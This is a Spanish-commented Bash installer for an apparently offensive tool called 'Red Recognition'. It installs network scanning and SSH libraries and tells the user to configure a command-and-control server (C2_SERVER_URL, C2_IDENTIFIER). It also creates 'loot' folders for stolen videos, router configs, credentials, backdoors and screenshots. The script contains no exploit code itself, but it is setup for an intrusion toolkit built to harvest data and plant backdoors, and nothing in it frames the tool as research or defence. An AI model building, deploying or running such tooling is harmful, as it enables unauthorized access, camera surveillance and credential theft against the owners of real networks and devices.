#!/bin/bash
# ============================================================================
# RED RECOGNITION - SETUP SCRIPT
# Script de instalación y configuración automática
# ============================================================================

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║         RED RECOGNITION - SETUP SCRIPT                    ║"
echo "║         Instalación y Configuración                       ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Verificar si se está ejecutando como root
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[!] Este script debe ejecutarse como root${NC}"
    echo -e "${YELLOW}    Ejecuta: sudo bash setup.sh${NC}"
    exit 1
fi

echo -e "${GREEN}[✓]${NC} Ejecutando como root"
echo ""

# 1. Actualizar sistema
echo -e "${YELLOW}[*]${NC} Actualizando sistema..."
apt-get update -qq

# 2. Instalar dependencias del sistema
echo -e "${YELLOW}[*]${NC} Instalando dependencias del sistema..."
apt-get install -y -qq python3 python3-pip nmap curl dnsutils ffmpeg libopencv-dev python3-opencv 2>/dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✓]${NC} Dependencias del sistema instaladas"
else
    echo -e "${RED}[!]${NC} Error instalando dependencias del sistema"
    exit 1
fi

# 3. Instalar dependencias de Python
echo -e "${YELLOW}[*]${NC} Instalando dependencias de Python..."
pip3 install -r requirements.txt -q

if [ $? -eq 0 ]; then
    echo -e "${GREEN}[✓]${NC} Dependencias de Python instaladas"
else
    echo -e "${RED}[!]${NC} Error instalando dependencias de Python"
    exit 1
fi

# 4. Crear archivo de configuración
if [ ! -f "config.env" ]; then
    echo -e "${YELLOW}[*]${NC} Creando archivo de configuración..."
    cp config.env.example config.env
    echo -e "${GREEN}[✓]${NC} Archivo config.env creado"
    echo -e "${YELLOW}    ⚠️  IMPORTANTE: Edita config.env con tus valores${NC}"
    echo -e "${YELLOW}    Especialmente: C2_SERVER_URL y C2_IDENTIFIER${NC}"
else
    echo -e "${GREEN}[✓]${NC} config.env ya existe"
fi

# 5. Crear directorios necesarios
echo -e "${YELLOW}[*]${NC} Creando estructura de directorios..."
mkdir -p reports
mkdir -p loot/stolen_videos
mkdir -p loot/router_configs
mkdir -p loot/credentials
mkdir -p loot/backdoors
mkdir -p harvested_files
mkdir -p loot/screenshots

echo -e "${GREEN}[✓]${NC} Directorios creados"

# 6. Verificar permisos
echo -e "${YELLOW}[*]${NC} Configurando permisos..."
chmod +x main.py
chmod 600 config.env 2>/dev/null

echo -e "${GREEN}[✓]${NC} Permisos configurados"

# 7. Verificación de instalación
echo ""
echo "═══════════════════════════════════════════════════════════"
echo "  VERIFICACIÓN DE INSTALACIÓN"
echo "═══════════════════════════════════════════════════════════"
echo ""

# Verificar Python
python3_version=$(python3 --version 2>&1)
echo -e "${GREEN}[✓]${NC} Python: $python3_version"

# Verificar módulos críticos
echo -e "${YELLOW}[*]${NC} Verificando módulos de Python..."

modules=("scapy" "nmap" "requests" "paramiko" "cv2")
all_ok=true

for module in "${modules[@]}"; do
    if python3 -c "import $module" 2>/dev/null; then
        echo -e "${GREEN}  [✓]${NC} $module"
    else
        echo -e "${RED}  [✗]${NC} $module - FALTA"
        all_ok=false
    fi
done

echo ""

if [ "$all_ok" = true ]; then
    echo "═══════════════════════════════════════════════════════════"
    echo -e "${GREEN}  ✓ INSTALACIÓN COMPLETADA EXITOSAMENTE${NC}"
    echo "═══════════════════════════════════════════════════════════"
    echo ""
    echo "PRÓXIMOS PASOS:"
    echo ""
    echo "1. Editar configuración:"
    echo "   nano config.env"
    echo ""
    echo "2. Configurar tu servidor C2 (opcional pero recomendado):"
    echo "   - Configura C2_SERVER_URL con tu servidor"
    echo "   - Configura C2_IDENTIFIER con tu identificador"
    echo ""
    echo "3. Ejecutar Red Recognition:"
    echo "   sudo python3 main.py"
    echo ""
    echo "═══════════════════════════════════════════════════════════"
else
    echo "═══════════════════════════════════════════════════════════"
    echo -e "${RED}  ✗ INSTALACIÓN INCOMPLETA${NC}"
    echo "═══════════════════════════════════════════════════════════"
    echo ""
    echo "Algunos módulos no se instalaron correctamente."
    echo "Intenta reinstalar manualmente:"
    echo "  pip3 install -r requirements.txt --force-reinstall"
    echo ""
fi

